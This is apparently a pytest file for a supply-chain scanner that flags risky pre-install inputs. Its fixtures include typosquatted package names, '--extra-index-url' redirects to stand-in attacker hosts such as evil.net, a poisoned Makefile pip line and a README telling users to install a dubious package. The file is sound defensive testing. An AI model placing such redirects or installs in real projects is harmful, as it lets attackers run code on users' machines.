"""Pre-install check tests (FR3 — the paper's SOURCED 7 checks)."""

from __future__ import annotations

from pathlib import Path

from setup_trap.model import Provenance, Severity
from setup_trap.scanner import preinstall
from setup_trap.scanner.parsers import parse_file


def _run(tmp_path, name, content, **kw):
    p = tmp_path / name
    p.write_text(content, encoding="utf-8")
    return preinstall.run(parse_file(p), **kw)


def _ids(findings):
    return {f.rule_id for f in findings}


def test_typosquat_name(tmp_path):
    findings = _run(tmp_path, "requirements.txt", "torchh\n")
    assert "PRE-NAME" in _ids(findings)
    f = [x for x in findings if x.rule_id == "PRE-NAME"][0]
    assert f.severity is Severity.CRITICAL
    assert f.provenance is Provenance.SOURCED
    assert "R-name" in f.source_ref


def test_separator_confusion(tmp_path):
    findings = _run(tmp_path, "requirements.txt", "azurecore\n")
    assert "PRE-SEP" in _ids(findings)
    assert "R-sep" in [x for x in findings if x.rule_id == "PRE-SEP"][0].source_ref


def test_source_redirect_nonpypi_is_critical(tmp_path):
    findings = _run(
        tmp_path, "requirements.txt",
        "--extra-index-url https://packages.evil.net/pypi\n",
    )
    src = [x for x in findings if x.rule_id == "PRE-SRC"][0]
    assert src.severity is Severity.CRITICAL


def test_localhost_index_is_critical(tmp_path):
    findings = _run(
        tmp_path, "requirements.txt", "--index-url http://127.0.0.1:8080/simple\n"
    )
    src = [x for x in findings if x.rule_id == "PRE-SRC"][0]
    assert src.severity is Severity.CRITICAL


def test_known_alt_index_is_info(tmp_path):
    findings = _run(
        tmp_path, "requirements.txt",
        "--extra-index-url https://download.pytorch.org/whl/cu121\n",
    )
    src = [x for x in findings if x.rule_id == "PRE-SRC"][0]
    assert src.severity is Severity.INFO


def test_hidden_index_flagged(tmp_path):
    findings = _run(
        tmp_path, "requirements.txt", "--extra-index-url https://evil.net/pypi\n"
    )
    assert "PRE-HIDDEN" in _ids(findings)


def test_makefile_poisoning(tmp_path):
    findings = _run(
        tmp_path, "Makefile",
        "install:\n\tpip install --extra-index-url https://evil.net/pypi -r r.txt\n",
    )
    mk = [x for x in findings if x.rule_id == "PRE-MAKE"][0]
    assert mk.severity is Severity.CRITICAL
    assert "R10" in mk.source_ref


def test_pinned_version_info_without_cve(tmp_path):
    findings = _run(tmp_path, "requirements.txt", "requests==2.19.0\n")
    pin = [x for x in findings if x.rule_id == "PRE-PIN"]
    assert pin and pin[0].severity is Severity.INFO
    assert "not verified" in pin[0].message.lower() or "not verified" in pin[0].message


def test_error_injection_in_readme(tmp_path):
    findings = _run(
        tmp_path, "README.md",
        "If you get a ModuleNotFoundError, run `pip install fast-jsonx` to fix it.\n",
    )
    err = [x for x in findings if x.rule_id == "PRE-ERRINJ"][0]
    assert "V7" in err.source_ref


def test_clean_requirements_no_criticals(tmp_path):
    findings = _run(
        tmp_path, "requirements.txt",
        "numpy>=1.26.0\npandas>=2.2.0\nrequests>=2.31.0\n",
    )
    assert not [f for f in findings if f.severity is Severity.CRITICAL]


def test_cve_check_degrades_without_tool(tmp_path, monkeypatch):
    # With check_cve=True but pip-audit absent, PRE-PIN stays INFO (never crashes).
    monkeypatch.setattr(preinstall.shutil, "which", lambda _: None)
    findings = _run(tmp_path, "requirements.txt", "requests==2.19.0\n", check_cve=True)
    pin = [x for x in findings if x.rule_id == "PRE-PIN"]
    assert pin and pin[0].severity is Severity.INFO


def test_all_preinstall_findings_are_sourced(tmp_path):
    findings = _run(
        tmp_path, "requirements.txt",
        "torchh\nazurecore\nrequests==2.19.0\n--extra-index-url http://10.0.0.5/x\n",
    )
    assert findings
    assert all(f.provenance is Provenance.SOURCED for f in findings)
    assert all("2607.15143" in (f.source_ref or "") for f in findings)
